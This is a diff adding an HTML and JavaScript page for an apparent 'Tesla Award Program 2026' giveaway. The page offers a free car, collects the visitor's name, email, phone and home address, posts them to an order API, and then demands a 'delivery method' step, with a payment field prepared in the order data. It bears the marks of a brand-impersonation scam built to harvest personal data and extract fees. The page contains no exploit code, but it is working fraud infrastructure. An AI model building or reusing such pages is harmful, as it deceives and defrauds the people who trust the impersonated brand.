@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Delivery Details | Tesla Award Program 2026</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/style.css">
+  <style>
+    body{background:var(--light);}
+    .page-wrap{max-width:700px;margin:0 auto;padding:88px 24px 64px;}
+    .page-card{background:white;border-radius:24px;box-shadow:0 20px 60px rgba(0,0,0,.09);border:1.5px solid rgba(0,0,0,.05);padding:48px;}
+    @media(max-width:560px){.page-card{padding:28px 20px;border-radius:18px;}}
+    .page-title{font-size:26px;font-weight:800;color:var(--dark);text-align:center;margin-bottom:8px;}
+    .page-sub{font-size:15px;color:var(--gray-2);text-align:center;line-height:1.65;margin-bottom:32px;}
+    .crumbs{display:flex;align-items:center;gap:8px;font-size:13px;color:var(--gray-2);margin-bottom:32px;justify-content:center;flex-wrap:wrap;}
+    .crumb-done{color:var(--success);font-weight:600}
+    .crumb-active{color:var(--red);font-weight:700}
+    .crumb-sep{color:var(--border)}
+    .selected-car-box{display:flex;align-items:center;gap:16px;background:var(--light);border-radius:16px;padding:16px 20px;margin-bottom:28px;border:1px solid rgba(0,0,0,.04)}
+    .selected-car-box img{height:70px;object-fit:contain}
+    .selected-car-box .car-info{flex:1}
+    .selected-car-box .car-name{font-size:17px;font-weight:800;color:var(--dark)}
+    .selected-car-box .car-price{display:flex;align-items:center;gap:8px;margin-top:4px}
+    .selected-car-box .car-price .strike{text-decoration:line-through;color:rgba(0,0,0,.4);font-size:13px}
+    .selected-car-box .car-price .free{font-size:11px;font-weight:800;background:var(--red);color:#fff;padding:2px 8px;border-radius:4px}
+    .change-link{font-size:13px;color:var(--red);font-weight:600;text-decoration:none;white-space:nowrap}
+    .change-link:hover{text-decoration:underline}
+    .form-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+    @media(max-width:580px){.form-grid{grid-template-columns:1fr}}
+    .form-full{grid-column:1/-1}
+    .success-check{width:80px;height:80px;background:var(--success);border-radius:50%;margin:0 auto 24px;display:flex;align-items:center;justify-content:center}
+    .success-check svg{width:38px;height:38px}
+    .note-box{background:rgba(59,130,246,.05);border:1px solid rgba(59,130,246,.15);border-radius:12px;padding:14px 18px;margin-top:20px;font-size:13px;color:#3B82F6;line-height:1.6;display:flex;align-items:flex-start;gap:10px}
+    .note-box svg{flex-shrink:0;margin-top:1px}
+  </style>
+  <link rel="icon" type="image/png" href="assets/tesla-award-logo.png">
+</head>
+<body>
+
+<nav class="nav">
+  <div class="nav-inner">
+    <a href="index.html" class="nav-logo">
+      <img src="assets/tesla-award-logo.png" alt="Tesla Award Program" style="height:30px;width:auto;vertical-align:middle">
+      TESLA
+    </a>
+    <a href="dashboard.html" class="btn btn-ghost" style="font-size:14px;">← Back to Dashboard</a>
+  </div>
+</nav>
+
+<div class="page-wrap">
+  <div class="crumbs">
+    <span class="crumb-done">✓ Verified</span><span class="crumb-sep">›</span>
+    <span class="crumb-done">✓ Vehicle Selected</span><span class="crumb-sep">›</span>
+    <span class="crumb-active">Delivery Details</span><span class="crumb-sep">›</span>
+    <span>Delivery Method</span><span class="crumb-sep">›</span>
+    <span>Confirmation</span>
+  </div>
+
+  <!-- STEP 1: Delivery Form -->
+  <div id="deliveryFormSection" class="page-card anim-fade-up">
+    <h1 class="page-title">📦 Delivery Details</h1>
+    <p class="page-sub">Enter your delivery information. All fields marked * are required.</p>
+
+    <!-- Selected car -->
+    <div class="selected-car-box" id="selectedCarBox">
+      <img src="" alt="" id="selectedCarImg" onerror="this.outerHTML='<span style=font-size:48px id=selectedCarImgFallback>🚗</span>'">
+      <div class="car-info">
+        <div class="car-name" id="selectedCarName">Tesla —</div>
+        <div class="car-price">
+          <span class="strike" id="selectedCarPrice">—</span>
+          <span class="free">FREE</span>
+        </div>
+      </div>
+      <a href="dashboard.html" class="change-link">Change</a>
+    </div>
+
+    <form id="deliveryDetailsForm" novalidate>
+      <div class="form-grid">
+        <div class="form-group">
+          <label class="form-label">Full Name *</label>
+          <input class="form-input" type="text" name="fullName" id="fullName" placeholder="James Anderson" required autocomplete="name">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Email Address *</label>
+          <input class="form-input" type="email" name="email" id="email" placeholder="james@email.com" required autocomplete="email">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Phone Number *</label>
+          <input class="form-input" type="tel" name="phone" id="phone" placeholder="+1 (555) 000-0000" required autocomplete="tel">
+        </div>
+        <div class="form-group form-full">
+          <label class="form-label">Street Address *</label>
+          <input class="form-input" type="text" name="address" id="address" placeholder="123 Main Street, Apt 4B" required autocomplete="street-address">
+        </div>
+        <div class="form-group">
+          <label class="form-label">City *</label>
+          <input class="form-input" type="text" name="city" id="city" placeholder="Los Angeles" required autocomplete="address-level2">
+        </div>
+        <div class="form-group">
+          <label class="form-label">State / Province *</label>
+          <input class="form-input" type="text" name="state" id="state" placeholder="California" required autocomplete="address-level1">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Postal / ZIP Code *</label>
+          <input class="form-input" type="text" name="zipCode" id="zipCode" placeholder="90001" required autocomplete="postal-code">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Country *</label>
+          <input class="form-input" type="text" name="country" id="country" placeholder="United States" required autocomplete="country-name">
+        </div>
+      </div>
+
+      <div class="note-box">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+        <span>Your progress is automatically saved. You can return anytime to continue where you left off.</span>
+      </div>
+
+      <div style="margin-top:24px;">
+        <button type="submit" class="btn btn-primary btn-full btn-lg" id="placeOrderBtn">🚀 Place Order</button>
+      </div>
+    </form>
+  </div>
+
+  <!-- STEP 2: Success view (hidden initially) -->
+  <div id="successSection" style="display:none;" class="page-card anim-fade-up">
+    <div class="success-check">
+      <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+    </div>
+    <h1 class="page-title">Order Placed! 🎉</h1>
+    <p class="page-sub">Your Tesla order has been created successfully. You must now choose a delivery method to proceed with the shipment.</p>
+    
+    <div id="orderSummaryBox" style="background:var(--light);border-radius:16px;padding:20px 24px;margin-bottom:24px;">
+      <div style="font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--gray-2);margin-bottom:14px;">Order Summary</div>
+      <div style="display:grid;grid-template-columns:auto 1fr;gap:8px 20px;font-size:14px;">
+        <span style="color:var(--gray-2)">Order #:</span>
+        <span style="color:var(--dark);font-weight:700;font-family:monospace" id="summaryOrderId">—</span>
+        <span style="color:var(--gray-2)">Vehicle:</span>
+        <span style="color:var(--dark);font-weight:600" id="summaryVehicle">—</span>
+        <span style="color:var(--gray-2)">Delivery:</span>
+        <span style="color:var(--dark);font-weight:600" id="summaryAddress">—</span>
+        <span style="color:var(--gray-2)">Date:</span>
+        <span style="color:var(--dark);font-weight:600" id="summaryDate">—</span>
+        <span style="color:var(--gray-2)">Status:</span>
+        <span class="status-badge status-confirmed" style="display:inline-flex;align-items:center;gap:6px;padding:2px 10px;border-radius:999px;font-size:11px;font-weight:700;background:rgba(0,165,80,.1);color:#00A550;">
+          <span style="width:7px;height:7px;background:#00A550;border-radius:50%;display:inline-block"></span>
+          Order Confirmed
+        </span>
+      </div>
+    </div>
+
+    <a href="delivery-method.html" class="btn btn-primary btn-full btn-lg">📦 Choose Delivery Method →</a>
+    <p style="font-size:12px;color:var(--gray-2);text-align:center;margin-top:14px;">You must select a delivery method before your order can be processed.</p>
+  </div>
+</div>
+
+<script src="js/config.js"></script>
+<script src="js/app.js"></script>
+<script src="js/vehicle-data.js"></script>
+<script>
+var selectedCar = JSON.parse(localStorage.getItem('tesla_selected_car') || 'null');
+var savedDelivery = JSON.parse(localStorage.getItem('tesla_delivery_details') || 'null');
+
+// If no car selected, redirect to dashboard
+if (!selectedCar) { window.location.href = 'dashboard.html'; }
+
+// Resume: if delivery already submitted and order exists, redirect to order-success
+var existingOrder = JSON.parse(localStorage.getItem('tesla_last_order') || 'null');
+if (existingOrder && savedDelivery) {
+  window.location.href = 'order-success.html';
+}
+
+// Populate car box
+var vi = VEHICLE_DATA[selectedCar.id] || null;
+document.getElementById('selectedCarImg').src = vi ? vi.img : '';
+document.getElementById('selectedCarName').textContent = 'Tesla ' + (selectedCar.name || '');
+document.getElementById('selectedCarPrice').textContent = selectedCar.price || '';
+
+// Pre-fill saved delivery
+if (savedDelivery) {
+  document.getElementById('fullName').value = savedDelivery.fullName || '';
+  document.getElementById('email').value = savedDelivery.email || '';
+  document.getElementById('phone').value = savedDelivery.phone || '';
+  document.getElementById('address').value = savedDelivery.address || '';
+  document.getElementById('city').value = savedDelivery.city || '';
+  document.getElementById('state').value = savedDelivery.state || '';
+  document.getElementById('zipCode').value = savedDelivery.zipCode || '';
+  document.getElementById('country').value = savedDelivery.country || '';
+}
+
+// Handle form submission
+document.getElementById('deliveryDetailsForm').addEventListener('submit', async function(e) {
+  e.preventDefault();
+  var form = e.target;
+  
+  var deliveryDetails = {
+    fullName: (form.fullName.value || '').trim(),
+    email: (form.email.value || '').trim(),
+    phone: (form.phone.value || '').trim(),
+    address: (form.address.value || '').trim(),
+    city: (form.city.value || '').trim(),
+    state: (form.state.value || '').trim(),
+    zipCode: (form.zipCode.value || '').trim(),
+    country: (form.country.value || '').trim()
+  };
+
+  if (!deliveryDetails.fullName || !deliveryDetails.email || !deliveryDetails.address ||
+      !deliveryDetails.city || !deliveryDetails.state || !deliveryDetails.zipCode || !deliveryDetails.country) {
+    showToast('Please fill in all required fields.', 'error');
+    return;
+  }
+
+  // Save progress immediately
+  try {
+    localStorage.setItem('tesla_delivery_details', JSON.stringify(deliveryDetails));
+  } catch(e) {
+    showToast('Unable to save your progress. Please try again.', 'error');
+    return;
+  }
+
+  showLoading('Creating your order...');
+
+  var sessionToken = localStorage.getItem('tesla_session_token') || getSession();
+
+  // Generate order
+  try {
+    var orderData = {
+      sessionToken: sessionToken,
+      selectedCar: selectedCar,
+      deliveryDetails: deliveryDetails,
+      deliveryMethod: null,
+      paymentMethod: null
+    };
+
+    var result = await apiCall('/order', 'POST', orderData);
+
+    // Save order
+    localStorage.setItem('tesla_last_order', JSON.stringify(result.order));
+
+    // Populate summary
+    document.getElementById('summaryOrderId').textContent = result.order.orderId || '—';
+    document.getElementById('summaryVehicle').textContent = 'Tesla ' + (selectedCar.name || '');
+    document.getElementById('summaryAddress').textContent = deliveryDetails.city + ', ' + deliveryDetails.country;
+    document.getElementById('summaryDate').textContent = new Date().toLocaleDateString('en-US', {month:'short', day:'numeric', year:'numeric'});
+
+    // Show success
+    hideLoading();
+    document.getElementById('deliveryFormSection').style.display = 'none';
+    document.getElementById('successSection').style.display = 'block';
+    document.getElementById('successSection').scrollIntoView({ behavior: 'smooth', block: 'start' });
+    launchConfetti(40);
+
+  } catch(err) {
+    hideLoading();
+    showToast(err.message || 'Failed to create order. Please try again.', 'error');
+  }
+});
+</script>
+</body>
+</html>
